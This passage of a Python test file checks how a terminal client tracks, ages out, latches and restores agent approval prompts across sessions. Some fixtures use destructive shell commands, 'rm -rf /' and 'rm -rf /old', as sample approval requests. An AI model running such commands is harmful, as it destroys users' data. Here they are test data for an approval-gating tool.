    latched = age_out_approvals(state, now=BASE_TIME + APPROVAL_STALE_AFTER + 1.0)
    assert "approval:sess-focus#1" in latched.flushed_prompt_ids

    switched = focus_session(latched, "sess-b")
    in_b = replay(
        [
            raw_event(
                "approval.request",
                {"description": "second", "command": "ls"},
                session_id="sess-b",
            )
        ],
        switched,
    )
    assert [p.request_id for p in in_b.prompts] == ["approval:sess-b#2"]
    assert not in_b.flushed_prompt_ids & {"approval:sess-b#2"}
    assert [row.summary for row in prompt_view(in_b).rows] == ["second"]

    # And back again: the counter climbs rather than restarting, so the
    # returned-to session cannot mint a key its own tombstone already holds.
    # ``prompts`` now also carries session B's still-outstanding second
    # approval (retained across the switch, CR3 finding 1) — filtering
    # through ``prompt_view`` is what isolates session A's own registration.
    back = focus_session(in_b, "sess-focus")
    in_a_again = replay(
        [raw_event("approval.request", {"description": "third", "command": "ls"})], back
    )
    assert in_a_again.prompt_for("approval:sess-focus#3") is not None
    assert [row.summary for row in prompt_view(in_a_again).rows] == ["third"]


def test_synthesized_ids_can_never_collide_across_sessions_by_construction() -> None:
    """Discharges U5's plan scenario 4 (docs/plans/2026-08-08-talaria-v0-2-
    answerability-and-session-story-plan.md, U5's test list): "a synthesized
    approval id latched in session A does not block the identically numbered
    synthesized id arriving in session B."

    That exact state cannot be built: ``approvals_seen`` is a single,
    monotonic, cross-session counter (:attr:`SessionState.approvals_seen`), so
    no two ``approval:<session>#<n>`` ids minted in one process ever carry the
    same number — there is no "session B's own #1" for session A's tombstoned
    #1 to collide with. What this test pins instead is the property that
    makes the plan's scenario unreachable rather than merely untested:
    revisiting a session, directly or by round-tripping through another one,
    always mints the next number in the sequence and never a number already
    spent — including one a retained tombstone already holds.
    """
    state = replay([raw_event("approval.request", {"description": "a1", "command": "ls"})])
    assert [p.request_id for p in state.prompts] == ["approval:sess-focus#1"]
    latched = age_out_approvals(state, now=BASE_TIME + APPROVAL_STALE_AFTER + 1.0)
    assert "approval:sess-focus#1" in latched.flushed_prompt_ids

    switched = focus_session(latched, "sess-b")
    in_b = replay(
        [
            raw_event(
                "approval.request", {"description": "b1", "command": "ls"}, session_id="sess-b"
            )
        ],
        switched,
    )
    # Session B's first approval mints #2, never #1 — the number session A's
    # tombstone already holds is never reissued, in this session or any other.
    assert [p.request_id for p in in_b.prompts] == ["approval:sess-b#2"]

    back_in_a = focus_session(in_b, "sess-focus")
    revisited = replay(
        [raw_event("approval.request", {"description": "a2", "command": "ls"})], back_in_a
    )
    # Returning to session A a second time does not restart the counter
    # either — #3, not #1 — so the tombstone retained from the first visit can
    # never swallow a later prompt that happens to share its old number.
    # (``prompts`` also still carries session B's own outstanding #2, kept
    # rather than cleared per CR3 finding 1 — the exact id is what matters
    # here, not the registry's full contents.)
    assert revisited.prompt_for("approval:sess-focus#3") is not None
    assert revisited.prompt_for("approval:sess-b#2") is not None


def test_a_prompt_belonging_to_another_session_never_reaches_the_screen() -> None:
    """The state built here is the one the in-flight refusal exists to prevent —
    a prompt from ``sess-focus`` sitting in the registry while ``sess-b`` is
    focused, as a late ``restore_prompt`` would leave it. The projection filters
    it out anyway: an answer aimed at it is refused by the registry
    (``REFUSED_WRONG_SESSION``), so a card offering one is an invitation to a
    keystroke that can only fail."""
    state = replay([raw_event("sudo.request", {"request_id": "req-1"})])
    stranded = replace(focus_session(state, "sess-b"), prompts=state.prompts)

    assert [p.request_id for p in stranded.prompts] == ["req-1"]
    assert prompt_view(stranded).rows == ()
    assert prompt_view(state).rows != ()

    # A prompt that names no session at all is still shown: it arrived before
    # any session id was on the wire, and withholding it would leave a question
    # visible in the transcript and unanswerable on screen.
    unattributed = replace(
        stranded, prompts=(replace(state.prompts[0], session_id=None),)
    )
    assert [row.request_id for row in prompt_view(unattributed).rows] == ["req-1"]


# ── U2/KTD8: the latch a whole-queue resolution leaves behind ────────────


def test_a_latched_id_is_refused_a_restore_its_own_call_would_have_earned() -> None:
    """The queued defect, at the level the rule lives.

    An approval whose single answer is in flight is *also* resolved by a
    ``all: true`` denial, because the gateway applies that choice to every
    entry in the queue. When the single answer then comes back a definite
    ``not_sent``, :func:`restore_prompt` is right in isolation — nothing
    reached a socket — and wrong in fact: the deny-all resolved that entry, and
    the gateway sends no second expiry, so the control it puts back never
    leaves again.
    """
    state = replay(
        [
            raw_event("approval.request", {"description": "first", "command": "ls"}),
            raw_event("approval.request", {"description": "second", "command": "rm -rf /"}),
        ]
    )
    approvals = state.outstanding_approvals(None)
    ids = tuple(p.request_id for p in approvals)
    assert len(ids) == 2

    # One approval's own answer goes out; the other is what a deny-all takes.
    answering, refusal = respond_to_prompt(state, ids[0])
    assert refusal == REFUSED_UNCORRELATED_APPROVAL, "two queued cannot be aimed at"
    swept, scope = respond_to_all_approvals(state, session_id=None)
    assert scope.denied == 2

    latched = latch_resolved_prompts(swept, approvals)
    # Approval keys stay bare — see latch_resolved_prompts's own docstring.
    assert set(ids) <= latched.flushed_prompt_ids

    # The restore its own ``not_sent`` would have earned is refused, and the
    # in-flight entry is still settled — the latch withholds resurrection, not
    # bookkeeping.
    back = restore_prompt(latched, state.prompts[0])
    assert back.prompt_for(ids[0]) is None
    assert back.answering_for(ids[0]) is None


def test_latching_nothing_changes_nothing() -> None:
    """Called on every resolved deny-all, including the ones with an empty
    sweep, so the no-op has to be exactly that."""
    state = replay([raw_event("sudo.request", {"request_id": "req-1"})])
    assert latch_resolved_prompts(state, ()) is state
    prompt = state.prompt_for("req-1")
    assert prompt is not None
    # A non-approval kind's key is session-qualified (A4), not the bare id —
    # see latch_resolved_prompts's own docstring and _flush_key.
    assert latch_resolved_prompts(state, (prompt,)).flushed_prompt_ids == frozenset(
        {f"{prompt.session_id or ''}:req-1"}
    )


# ── Round three, Root A: prompt retention rippled into single-session code ──


def test_a_second_sessions_own_prompt_registers_under_a_shared_bare_id() -> None:
    """A1 (HIGH, state.py:1653 in the reviewer's line numbering): registration
    used to dedupe by bare ``request_id`` alone. With session A's ``req-1``
    retained across a switch (CR3), session B's own, independently arrived
    ``req-1`` collided with it and was silently dropped as a duplicate — B's
    gateway prompt got no control in Talaria at all. Registration identity is
    (session, request id)."""
    state = replay([raw_event("sudo.request", {"request_id": "req-1"}, session_id="sess-a")])
    switched = focus_session(state, "sess-b")
    in_b = replay(
        [raw_event("sudo.request", {"request_id": "req-1"}, session_id="sess-b")],
        switched,
    )
    assert in_b.duplicate_prompts_ignored == 0, "B's own req-1 must not read as a duplicate"
    prompt_a = in_b.prompt_for("req-1", session_id="sess-a")
    prompt_b = in_b.prompt_for("req-1", session_id="sess-b")
    assert prompt_a is not None and prompt_a.session_id == "sess-a"
    assert prompt_b is not None and prompt_b.session_id == "sess-b"
    assert prompt_a is not prompt_b


def test_respond_to_prompt_finds_the_asking_sessions_entry_when_ids_collide() -> None:
    """A1 continued: once two sessions may each hold their own prompt under
    the same bare id, a session-blind lookup would answer whichever one
    happens to be first in the registry rather than the one the caller
    actually meant."""
    state = replay([raw_event("sudo.request", {"request_id": "req-1"}, session_id="sess-a")])
    switched = focus_session(state, "sess-b")
    in_b = replay(
        [raw_event("sudo.request", {"request_id": "req-1"}, session_id="sess-b")],
        switched,
    )
    answering, refusal = respond_to_prompt(in_b, "req-1", session_id="sess-b")
    assert refusal is None
    assert answering.answering_for("req-1", session_id="sess-b") is not None
    # Session A's own req-1 is untouched — still outstanding, not answered.
    assert answering.prompt_for("req-1", session_id="sess-a") is not None


def test_respond_to_prompt_still_names_wrong_session_when_only_one_entry_exists() -> None:
    """The common case — only one entry, in a session other than the one
    asking — must keep its precise refusal reason rather than degrading to
    the less informative "not outstanding"."""
    state = replay([raw_event("sudo.request", {"request_id": "req-1"}, session_id="sess-a")])
    _, refusal = respond_to_prompt(state, "req-1", session_id="sess-b")
    assert refusal == REFUSED_WRONG_SESSION


def test_a_tool_completion_flushes_only_its_own_sessions_clarify() -> None:
    """A2 (MEDIUM, state.py:1590): the clarify-completion flush used to
    iterate ``state.prompts`` globally, so session B's own tool completing
    could flush session A's retained, still-outstanding clarify — a control
    the operator could still see and answer, cleared out by an unrelated
    conversation."""
    state = replay(
        [
            raw_event(
                "clarify.request",
                {"request_id": "req-1", "question": "Which file?"},
                session_id="sess-a",
            )
        ]
    )
    switched = focus_session(state, "sess-b")
    after = replay(
        [raw_event("tool.complete", {"name": "clarify"}, session_id="sess-b")], switched
    )
    assert after.prompt_for("req-1", session_id="sess-a") is not None, (
        "session B's tool completion must not flush session A's clarify"
    )


def test_age_out_removes_a_foreign_sessions_stale_approval_silently() -> None:
    """The round-eight ruling splits the age-out's removal from its effects.

    The old A3 guard deferred a foreign session's whole age-out "until that
    session is focused again" — and round eight established that a session
    whose runtime id was trimmed can never be focused again, so the deferral
    was permanent and ``prompts`` grew one approval per land-approve-switch
    cycle (the driver's probe: 11 of 12 prompts surviving age-out at 1000x
    :data:`APPROVAL_STALE_AFTER`). The REMOVAL is now unconditional at the
    threshold for every session. What A3 rightly protected stays protected,
    as the PRESENTATION half: no increment of the focused session's
    ``withdrawn_approvals`` and no foreign command written into the focused
    transcript — the merged multi-session view the plan's non-goals forbid
    (docs/plans/2026-08-08-talaria-v0-2-answerability-and-session-story-
    plan.md:519)."""
    state = replay(
        [raw_event("approval.request", {"description": "x", "command": "ls"}, session_id="sess-a")]
    )
    switched = focus_session(state, "sess-b")
    aged = age_out_approvals(switched, now=BASE_TIME + APPROVAL_STALE_AFTER + 10.0)

    # Removal: unconditional at threshold, and latched so a late restore
    # cannot resurrect a control Talaria has stopped holding.
    assert aged.prompt_for("approval:sess-a#1", session_id="sess-a") is None, (
        "a foreign session's stale approval must age out while unfocused"
    )
    assert "approval:sess-a#1" in aged.flushed_prompt_ids
    restored = restore_prompt(aged, switched.prompts[0])
    assert restored.prompt_for("approval:sess-a#1", session_id="sess-a") is None, (
        "the tombstone must refuse a late restore of the aged-out foreign approval"
    )

    # Presentation: still focus-scoped — session B's counter is untouched and
    # its transcript carries no line about session A's command.
    assert aged.withdrawn_approvals == 0, (
        "a foreign withdrawal must not increment the focused session's counter"
    )
    assert aged.transcript == switched.transcript, (
        "a foreign withdrawal must not write into the focused session's transcript"
    )


def test_age_out_still_counts_and_writes_the_line_for_the_focused_session() -> None:
    """The presentation half of the split, unchanged from before it.

    One focused and one foreign stale approval in a single call, so the
    partition itself is under test: both prompts are REMOVED, and exactly the
    focused one is PRESENTED — ``withdrawn_approvals`` goes to 1, and the one
    new ``prompt-expired`` transcript line names the focused session's
    command and not the foreign session's."""
    state = replay(
        [
            raw_event(
                "approval.request",
                {"description": "foreign", "command": "rm -rf /old"},
                session_id="sess-a",
            )
        ]
    )
    switched = focus_session(state, "sess-b")
    both = replay(
        [
            raw_event(
                "approval.request",
                {"description": "mine", "command": "make deploy"},
                session_id="sess-b",
            )
        ],
        switched,
    )
    aged = age_out_approvals(both, now=BASE_TIME + 2 * APPROVAL_STALE_AFTER)

    assert aged.prompts == (), "both stale approvals must be removed in one tick"
    assert {"approval:sess-a#1", "approval:sess-b#2"} <= aged.flushed_prompt_ids
    assert aged.withdrawn_approvals == 1, (
        "exactly the focused session's withdrawal may be counted"
    )
    notes = [e for e in aged.transcript if e.kind == "prompt-expired"]
    assert len(notes) == 1, "exactly one withdrawal line: the focused session's"
    assert APPROVAL_AGED_OUT in notes[0].text
    assert "make deploy" in notes[0].text
    assert "rm -rf /old" not in notes[0].text, (
        "the foreign session's command must not appear in the focused transcript"
    )


def test_an_expiry_only_clears_its_own_sessions_colliding_entry() -> None:
    """Root-A sweep: ``_on_prompt_expire`` also matched by bare id. With
    session A's retained ``req-1`` and session B's own, independently
    arrived ``req-1``, an expiry naming B's session could clear and
    tombstone A's unrelated entry instead of B's — or clear both when only
    one actually expired."""
    state = replay([raw_event("sudo.request", {"request_id": "req-1"}, session_id="sess-a")])
    switched = focus_session(state, "sess-b")
    in_b = replay(
        [raw_event("sudo.request", {"request_id": "req-1"}, session_id="sess-b")],
        switched,
    )
    expired = replay(
        [raw_event("sudo.expire", {"request_id": "req-1"}, session_id="sess-b")], in_b
    )
    assert expired.prompt_for("req-1", session_id="sess-b") is None, "B's own entry expired"
    assert expired.prompt_for("req-1", session_id="sess-a") is not None, (
        "A's unrelated, still-outstanding entry must survive B's expiry"
    )


def test_answering_one_sessions_prompt_does_not_drop_a_colliding_id_elsewhere() -> None:
    """Root-A sweep: ``_start_answering`` removed from ``state.prompts`` by
    bare id, so answering session B's own ``req-1`` would also silently drop
    session A's unrelated, still-outstanding ``req-1`` from the registry — a
    control nobody ever touched, simply gone."""
    state = replay([raw_event("sudo.request", {"request_id": "req-1"}, session_id="sess-a")])
    switched = focus_session(state, "sess-b")
    in_b = replay(
        [raw_event("sudo.request", {"request_id": "req-1"}, session_id="sess-b")],
        switched,
    )
    answering, refusal = respond_to_prompt(in_b, "req-1", session_id="sess-b")
    assert refusal is None
    assert answering.prompt_for("req-1", session_id="sess-a") is not None, (
        "answering B's prompt must not remove A's unrelated same-id entry"
    )


def test_latching_one_sessions_prompt_does_not_tombstone_anothers_same_id() -> None:
    """A4 (MEDIUM, app.py:1631): ``latch_resolved_prompts`` used to write
    bare ids, so latching session A's ``req-1`` (as an interrupt sweep does)
    tombstoned session B's own, unrelated ``req-1`` too — refusing forever to
    restore a control the gateway was still holding open for B."""
    state = replay([raw_event("sudo.request", {"request_id": "req-1"}, session_id="sess-a")])
    switched = focus_session(state, "sess-b")
    in_b = replay(
        [raw_event("sudo.request", {"request_id": "req-1"}, session_id="sess-b")],
        switched,
    )
    prompt_a = in_b.prompt_for("req-1", session_id="sess-a")
    prompt_b = in_b.prompt_for("req-1", session_id="sess-b")
    assert prompt_a is not None and prompt_b is not None

    # A's own req-1 is latched, the way an interrupt sweep for session A would.
    latched = latch_resolved_prompts(in_b, (prompt_a,))

    # B's req-1 answer goes out, and then reaches no socket at all.
    answering, refusal = respond_to_prompt(latched, "req-1", session_id="sess-b")
    assert refusal is None
    restored = restore_prompt(answering, prompt_b)
    assert restored.prompt_for("req-1", session_id="sess-b") is not None, (
        "A's latch must not block B's own req-1 from being restored"
    )
